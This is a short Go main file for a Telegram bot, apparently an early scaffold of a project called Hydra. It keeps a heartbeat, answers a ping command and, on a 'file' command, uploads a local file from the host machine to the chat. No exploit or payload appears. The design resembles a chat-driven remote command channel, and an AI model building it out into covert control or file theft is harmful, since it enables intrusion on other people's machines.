package main

import (
	"fmt"
	"log"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/util"
)

func main() {
	log.Println("Logged in as", api.Bot.Self.UserName)
	log.Println("Genesis is", util.Genesis)
	go api.Heartbeat()
	for u := range api.Updates {
		if u.Message == nil {
			continue
		}
		log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		if u.Message.IsCommand() {
			switch u.Message.Command() {
			case "ping":
				api.SendMessage(u.Message, "Pong!")
			case "reset":
				close(api.StopHeartbeat)
				util.Genesis = api.SendMessage(u.Message, "Genesis").MessageID
				go api.Heartbeat()
			case "file":
				wha, err := api.Bot.UploadFile("sendPhoto", map[string]string{
					"chat_id": fmt.Sprint(u.Message.Chat.ID),
				}, "photo", "C:\\Users\\Raffy\\Desktop\\wha.png")
				fmt.Println(err)
				fmt.Println(wha)
			}
		}
	}
}
